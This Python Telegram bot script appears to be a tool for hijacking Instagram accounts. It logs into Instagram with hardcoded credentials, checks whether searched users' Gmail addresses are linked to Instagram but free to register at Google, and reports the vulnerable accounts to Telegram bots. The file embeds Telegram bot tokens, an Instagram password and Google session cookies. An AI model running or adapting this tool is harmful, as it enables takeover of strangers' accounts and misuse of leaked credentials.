import requests
import telebot
from user_agent import generate_user_agent
from telebot import types
from datetime import datetime
from time import sleep

token='1925842455:AAFy2qfWKzR91oyamPBPPeCwFqmokIzAVTg'
bot=telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start(message):
	keyboard=types.InlineKeyboardMarkup()
	but1=types.InlineKeyboardButton(text= 'Add names .',callback_data='id')
	but2=types.InlineKeyboardButton(text= 'Start Chckers .',callback_data='so')
	keyboard.add(but1,but2)
	bot.reply_to(message,'- Hi Chekers 2012 .',reply_markup=keyboard)


		      
@bot.callback_query_handler(func=lambda call : True)
def callback_data(call):
	if call.message:
		if call.data=='id':
			bot.send_message(call.message.chat.id,'send users ')
			@bot.message_handler(func=lambda m: True)
			def marL(message):
				msg = message.text
				file = open("KARLO.txt", 'w').write(f'{msg}\n')
				bot.send_message(call.message.chat.id,'Done Save name ✔️ ')

		if call.data=='so':		      
		      user = ('1karlos9')
		      pasw = ('xxddeerr')
		      print('_____________________________________')
		      url = "https://www.instagram.com/accounts/login/ajax/"
		      head = {
		          'accept':'*/*',
		          'accept-encoding':'gzip,deflate,br',
		          'accept-language':'en-US,en;q=0.9,ar;q=0.8',
		          'content-length':'269',
		          'content-type':'application/x-www-form-urlencoded',
		          'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
		          'origin':'https://www.instagram.com',
		          'referer':'https://www.instagram.com/',
		          'sec-fetch-dest':'empty',
		          'sec-fetch-mode':'cors',
		          'sec-fetch-site':'same-origin',
		          'user-agent': generate_user_agent(),
		          'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
		          'x-ig-app-id':'936619743392459',
		          'x-ig-www-claim':'0',
		          'x-instagram-ajax':'8a8118fa7d40',
		          'x-requested-with':'XMLHttpRequest',
		      }
		      time_now = int(datetime.now().timestamp())
		      data = {
		          'username': user,
		          'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pasw}',
		          'queryParams': {},
		          'optIntoOneTap': 'false'
		      }

		      login = requests.post(url,headers=head,data=data )
		      hj=0
		      hi=0
		      hu=0		      
		      if 'userId' in login.text:
		          bot.send_message(call.message.chat.id,'login ..')
		      
		          co = login.cookies
		          coo = co.get_dict()
		          csrf = coo['csrftoken']
		          cookie = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']};"
		          print('[-] login Done ')
		          pass
		      else:
		       print(f'[!] false information')		       
		      target = open('KARLO.txt','r').read().splitlines()
		      for w in target:
		      	url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={w}&rank_token=0.43795339202867134&include_reel=true'
		      	heed={
		      	'accept': '*/*',
		      	'accept-encoding': 'gzip, deflate, br',
		      	'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		      	'cookie': cookie,
		      	'referer': 'https://www.instagram.com/hoooooyeony/',
		      	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
		      	'x-asbd-id': '198387',
		      	'x-ig-app-id': '936619743392459',
		      	'x-ig-www-claim': 'hmac.AR1LhkH588h7rRe90FcWe3RN01Rf8widnkCoQALWOii6a0XA',
		      	'x-requested-with': 'XMLHttpRequest'
		      	}
		      	response= requests.get(url,headers=heed).json()['users']
		      	for ig in response:
		      		m=str(ig['user']['username'])
		      		file = open("userSerh.txt", 'w').write(f'{m}\n')
		      		words = open('userSerh.txt','r').read().splitlines()
		      		for dd in words:
		      				        url='https://www.instagram.com/accounts/web_create_ajax/attempt/'
		      				        head={
		      		      		          'accept': '*/*',
		      		      		          'accept-encoding': 'gzip, deflate, br',
		      		      		          'accept-language': 'en-US,en;q=0.9',
		      		      		          'content-length': '73',
		      		      		          'content-type': 'application/x-www-form-urlencoded',
		      		      		          'cookie': 'ig_did=E1069C00-B44A-4C3C-AEC6-2EDFF828476E; csrftoken=P5sthEF9HF67DQDTu6t2pE2w0YgBB29l; mid=YFNJ-gALAAFOnl3VaylOWdyOj2VX; ig_nrcb=1',
		      		      		          'origin': 'https://www.instagram.com',
		      		      		          'referer': 'https://www.instagram.com/accounts/emailsignup/',
		      		      		          'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		      		      		          'sec-ch-ua-mobile': '?0',
		      		      		          'sec-fetch-dest': 'empty',
		      		      		          'sec-fetch-mode': 'cors',
		      		      		          'sec-fetch-site': 'same-origin',
		      		      		          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		      		      		          'x-csrftoken': 'P5sthEF9HF67DQDTu6t2pE2w0YgBB29l',
		      		      		          'x-ig-app-id': '936619743392459',
		      		      		          'x-ig-www-claim': '0',
		      		      		          'x-instagram-ajax': 'b3c72bbefcea',
		      		      		          'x-requested-with': 'XMLHttpRequest'
		      		      		          
		          }    
		      		          
		      				        data={
		      		      		          'email': f"{dd}@gmail.com",
		      		      		          'username': '',
		      		      		          'first_name': '',
		      		      		          'opt_into_one_tap': 'false'
		      		      		      		      }
		      				        req=requests.post(url,headers=head,data=data).text
		      				        hj+=1
		      				        print("{dd}") 
		      				        if '"code": "email_is_taken"' in req:
		      				      		      		            url="https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=363209&rt=j"
		      				      		      		            head = {
		      		      'accept': '*/*',
		      		      'accept-encoding': 'gzip, deflate, br',
		      		      'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		      		      'content-length': '1408',
		      		      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		      		      'cookie': 'HSID=AD2vItja-8cBBC8xH; SSID=AtC3MotkU70rw7Qe2; APISID=opIfCEhQMTFP2r32/AEwwW58ZmHBuBr1n-; SAPISID=0Gi0ly38r8COOBn4/A1qEoi3CApEPcaUMW; Secure-1PAPISID=0Gi0ly38r8COOBn4/A1qEoi3CApEPcaUMW; __Secure-3PAPISID=0Gi0ly38r8COOBn4/A1qEoi3CApEPcaUMW; ACCOUNT_CHOOSER=AFx_qI7y5dmfkyiDkb8_Q0wJTj4eYfJFXtUASoNs19MJjTtgvrVfbCkNAp112GFI2AY4r0qX2AsMZg16mueUyZ2ioSQmqQkNUN3n9TjUeRpWbF5PZMLO0JTK57XXOnt4t33YCWPN7tx8DlTRWitJaYKDV8kgANmwYQxdBFPZX5RNX8pqR7dmiyrDGRZdHCKS05Fc57rJhK5i6e-JfTubwTqVAx0E063S8M-ztI8Ge9KjQirkc6WGNp5oepzYMNeNuVpSTxaoDzuNWjlSb8GxDl-afd8nbYPGvus89oyLcMSJS7AVm2_-UuDY8cVbApEOEVjFPcdOd0bYYUZUJ94KHn9IXuRhN1OyojMGgA6xagbDvHnAMUsMUqc; LSOLH=|||_SVI_EKK57ZSruPICGAkiP01BRURIZl9xTUw2Y0pWNzZUTGE0cTdPcEtyUVdVd0ZwX1I4bjhrb01hZFd6UHBfRktVc0dycjdtNU1zNlIzUQ_:|||27153564:cd2c; OGP=-19022539:-19020770:; SID=BwjKXCS_oa2NFz6zw2zMNmjs-u5ZN3nlUw0-uAVRH3BarbMbuCyh_HtuzFfoYSC-UNBo-Q.; __Secure-1PSID=BwjKXCS_oa2NFz6zw2zMNmjs-u5ZN3nlUw0-uAVRH3BarbMbxxoF4N-mB4rSVuqKi3YhZw.; __Secure-3PSID=BwjKXCS_oa2NFz6zw2zMNmjs-u5ZN3nlUw0-uAVRH3BarbMbCthxMfHsRBMGoTh5Tl4eGA.; OGPC=19022539-1:19020770-4:19025836-2:; LSID=doritos|o.chat.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.FR|s.IQ|s.blogger|s.youtube:CAjKXGJGTD8tCMy85xuTYv8fk9GMiYCxmx2mKtvY4Lhje16OjRy1jqQrBeQA4rSN8ETxwg.; __Host-1PLSID=doritos|o.chat.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.FR|s.IQ|s.blogger|s.youtube:CAjKXGJGTD8tCMy85xuTYv8fk9GMiYCxmx2mKtvY4Lhje16OJsMMXDueXCmt4JeAFZXGyg.; __Host-3PLSID=doritos|o.chat.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.FR|s.IQ|s.blogger|s.youtube:CAjKXGJGTD8tCMy85xuTYv8fk9GMiYCxmx2mKtvY4Lhje16OCCVbJDrA1nY0zok1CuIRrw.; SEARCH_SAMESITE=CgQIxpMB; NID=223=brcNk_OfeIollKqND3a73HpBeNYSUz5azhT7sPWvawVKmnsJ1pWpRV1JFnXDqYntmQMsh16_p-lq7cATmlUMDgU_kzX_kcxorFFxX8IrprMvTjz-3L2dFSOhLmlyFrCw5PF6Foz4cMit9doZJO-q3pXnZk1sTN9FY7uKmFg0F92piQJUciOAVAFw5zPR_dJj9gjk8i3cL2pKjPyVlECbjD_uBDCUCJxyicLmq9boYNlZmsE2recVlZG2I0VJw4tcyTTrifjxlacHu-UBxF4zeAElK7LXF8ZEnlr4ikv-jSchZ02iF3jmlzoRRik4xB7msC0Hkna0HNAOKxLoeNlz3kO_x7FMY2mdxkhLA02RwkcgHHcryrDZ5m5d7_6vboH_LSyrMh56DFUQJzrQw; 1P_JAR=2021-09-19-14; __Host-GAPS=1:Rcg_sagRuc9mQqV6xuh9x_dYjnfNEs96aLkrvjzXPu3hhsi8P9lqhyOoi14wN3pzhbvFDI1pwIDcOx5nFMQMnSGxl9lICQ:ZKy9bOxu3hpD7rsG; SIDCC=AJi4QfGTVcIDOEEXsowwmBbxol0EHPSvFoZQTZyBgtM471xVDZ14joAQ836jC0IGaADTXEVV_g; __Secure-3PSIDCC=AJi4QfFheJlHE8_IMpXorcIW7gMt3ehAkhYqZ1sqCKiUFP8dTK8PdwMkyiHbMVU6nMk-jXFaqQ',
		      		      'google-accounts-xsrf': '1',
		      		      'origin': 'https://accounts.google.com',
		      		      'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&dsh=S-1426050280%3A1632061677598915&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
		      		      'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
		      		      'sec-ch-ua-mobile': '?0',
		      		      'sec-ch-ua-platform': '"Windows"',
		      		      'sec-fetch-dest': 'empty',
		      		      'sec-fetch-mode': 'cors',
		      		      'sec-fetch-site': 'same-origin',
		      		      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
		      		      'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=444aad39-ff3c-4d5c-995d-8eacca5420fb,signin_mode=all_accounts,signout_mode=show_confirmation',
		      		      'x-client-data': 'CJO2yQEIprbJAQjEtskBCKmdygEIyuTKAQjv8ssBCLP4ywEInvnLAQiw+ssBCL3+ywEIn//LAQjqg8wBCNGEzAE=',
		      		      'x-same-domain': '1'
		      		      }
		      				      		      		            data = {
		      		      'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue',
		      		      'service': 'accountsettings',
		      		      'dsh': 'S-1426050280:1632061677598915',

'f.req': f'["AEThLlxDYEtEUDmmHHm9Laz_aCGEwSjWG_99ym37eZIvleWHMDjMlXGy5PwhznUnoQ47EEgiRn6YOZwpwQAVDsNBEsmsQQ6d-0vkRvAslPTP6YL64sHozxziIvZPsQnn-q_VDjD1ND-d_39-BOVyWzQ2aH27bT3AKSLK0JQXHR-jBcjEdYQYCKfm-WiMvj0AlqA-d9DW5o6lHrxvhO_hRA2wG0EfEAWyug","vwc","fwef","{dd}",true,"S-1426050280:1632061677598915",1]',
		      		      'at': 'AFoagUXMRRJoyzEt17uWsaGJIo0iDnOGhA:1632061984015',
		      		      'azt': 'AFoagUXzkzVnyY5S4Yjv-1fdtn6qBlUYtA:1632061984015',
		      		      'cookiesDisabled': 'false',
		      		      'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"444aad39-ff3c-4d5c-995d-8eacca5420fb",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false,1,""]',
		      		      'gmscoreversion': 'undefined'
		      		      
		          }
		      				      		      		            req=requests.post(url,headers=head,data=data).text
		      				      		      		            if '["e",2,null,null,145]]]' in req:
		      				      		      		            	hi+=1
		      				      		      		        #    	print(Z +f"{dd} Band ")		      		             
		      				      		      		            else:
		      				      		      		      		      		        if '["e",2,null,null,47]]]' in req:
		      				      		      		      		      		        	hu+=1
		      				      		      		      		      		        	print(f"{dd}Goood")
		      				      		      		      		      		        	file = open("2012bot.txt", "w").write(f'{dd}\n')
		      				      		      		      		      		        	id = "901011671"
		      				      		      		      		      		        	to='2104093751:AAG8HVV_1d9oIsWg55Xwj0SWAwT5lw0FWe8'
		      				      		      		      		      		        	tok="1689406175:AAEmknwF3MsfcUr4g86KEPyBx4FsPjCphFk"
		      				      		      		      		      		        	users1= open("2012bot.txt",'r').read().splitlines()
		      				      		      		      		      		        	for users in users1:
		      				      		      		      		      		        	   head = {
          'HOST': "www.instagram.com",
          'KeepAlive' : 'True',
          'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
          'Cookie': cookie,
          'Accept' : "*/*",
          'ContentType' : "application/x-www-form-urlencoded",
          "X-Requested-With": "XMLHttpRequest",
          "X-IG-App-ID" : "936619743392459",
          "X-Instagram-AJAX" : "missing",
          "X-CSRFToken" : "missing",
          "Accept-Language" : "en-US,en;q=0.9"
        }
		      				      		      		      		      		        	   url_id = f"https://www.instagram.com/{users}/?__a=1"
		      				      		      		      		      		        	   req_id = requests.get(url_id, headers=head).json()		      		      		           
		      				      		      		      		      		        	   iid = str(req_id['graphql']['user']['id'])
		      				      		      		      		      		        	   posts=str(req_id['graphql']['user']['edge_owner_to_timeline_media']['count'])
		      				      		      		      		      		        	   folo = str(req_id['graphql']['user']['edge_followed_by']['count'])
		      				      		      		      		      		        	   folg = str(req_id['graphql']['user']['edge_follow']['count'])
		      				      		      		      		      		        	   aa= (f'{iid}')
		      				      		      		      		      		        	   if 'KeyError' in aa:
		      				      		      		      		      		        	   	print("No fuod user !!..")
		      				      		      		      		      		        	   else:
		      				      		      		      		      		        	       u = f'https://o7aa.pythonanywhere.com/?id={iid}'
		      				      		      		      		      		        	       head = {
		      		          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		      		          'Accept-Encoding': 'gzip, deflate, br',
		      		          'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
		      		          'Connection': 'keep-alive',
		      		          'Host': 'o7aa.pythonanywhere.com',
		      		          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70'
		          }
		      				      		      		      		      		        	       reqo=requests.get(u,headers=head).json()
		      				      		      		      		      		        	       gs=str(reqo["data"])
		      				      		      		      		      		        	       dj=(f'{gs}')
		      				      		      		      		      		        	       if "2013" in dj:
		      				      		      		      		      		        	       	hi=(f'''
====================
⌯ 𝐮𝐬𝐞𝐫 : {dd}
⌯ 𝐞𝐦𝐚𝐢𝐥 : {dd}@gmail.com
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {folo}
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {folg}
⌯ 𝐝𝐚𝐭𝐚 : 2012 ⚡️
⌯ 𝐩𝐨𝐬𝐭 : {posts}
=================
- @QYQQQ
		          ''')
		      				      		      		      		      		        	       	tl=(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={hi}')
		      				      		      		      		      		        	       	req5 =requests.post(tl)
		      				      		      		      		      		        	       else:
		      				      		      		      		      		        	       	hl=(f'''
====================
⌯ 𝐮𝐬𝐞𝐫 : {dd}
⌯ 𝐞𝐦𝐚𝐢𝐥 : {dd}@gmail.com
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {folo}
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {folg}
⌯ 𝐝𝐚𝐭𝐚 : {dj}
⌯ 𝐩𝐨𝐬𝐭 : {posts}
=================
- @QYQQQ
		          ''')		      		      		      		       
		      				      		      		      		      		        	       	ti=(f'https://api.telegram.org/bot{to}/sendMessage?chat_id={id}&text={hl}')
		      				      		      		      		      		        	       	eq5 =requests.post(ti)
		      		      		      		      		      		      		      
		      		      		      		      		      		      		      		      
		      				      		      		      		      		        	       if "2014" in dj:
		      				      		      		      		      		        			         tg="901011671"
		      				      		      		      		      		        			         hk=(f'''
====================
⌯ 𝐮𝐬𝐞𝐫 : {dd}
⌯ 𝐞𝐦𝐚𝐢𝐥 : {dd}@gmail.com
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {folo}
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {folg}
⌯ 𝐝𝐚𝐭𝐚 : 2013 ❗
⌯ 𝐩𝐨𝐬𝐭 : {posts}
=================
- @QYQQQ
		          ''')		      		             
		      				      		      		      		      		        			         tgg="1385619564:AAGQyKbJJSp7wHiLBLjngbq7TTQS2ftUpVM"
		      				      		      		      		      		        			         tggg=(f'https://api.telegram.org/bot{tgg}/sendMessage?chat_id={tg}&text= {hk}')
		      				      		      		      		      		        			         reqg5 =requests.post(tggg)
		      		      		      		      		      		      		          
		      		      		      		      		      		      		      		      
		      		      		      		      		      		      		      		      
		      		      		      		      		      		      		      
		      		      		      		      		         #     else:
		      				      		      		            if '["e",2,null,null,79]]]' in req:
		      				      		      		      		      		        print(f"{dd}")
		      				      		      		      		      		        hi+=1		      
		      				      		      		            else:
		      				      		      		      		      		      		            if '["e",2,null,null,79]]]' in req:
		      				      		      		      		      		      		            	hi+1
		      				      		      		      		      		      		            	print(f"{dd}")
		      		      		      				      		      		      		      		      		            			
		      				      		      		            bot.send_message(call.message.chat.id,'- Done Chcker')		      				        
		      else:
		      	bot.send_message(call.message.chat.id,'login ❌')
print('dark .')
bot.polling()